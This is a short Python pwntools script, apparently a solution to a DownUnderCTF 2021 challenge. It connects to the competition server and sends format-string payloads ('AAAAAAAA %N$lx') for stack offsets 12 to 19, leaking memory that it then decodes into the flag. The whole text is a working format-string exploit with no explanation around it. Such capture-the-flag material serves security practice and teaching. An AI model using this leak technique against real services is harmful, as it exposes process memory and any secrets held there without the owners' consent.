from pwn import *

# nc pwn-2021.duc.tf 31918

p = remote("pwn-2021.duc.tf", 31918)


output = []

for i in range(12, 20):
    p.recvuntil(b"What is your name?\n")
    format_string = "AAAAAAAA %{}$lx".format(i)
    p.sendline(format_string.encode())
    p.recvline()
    resp = p.recvline().strip().decode().split()[-1]
    output.append(resp)

p.close()

flag = b""

for i in output:
    i = bytes.fromhex(i.rjust(16, "0"))
    flag += u64(i).to_bytes(8, 'big')

print(flag)
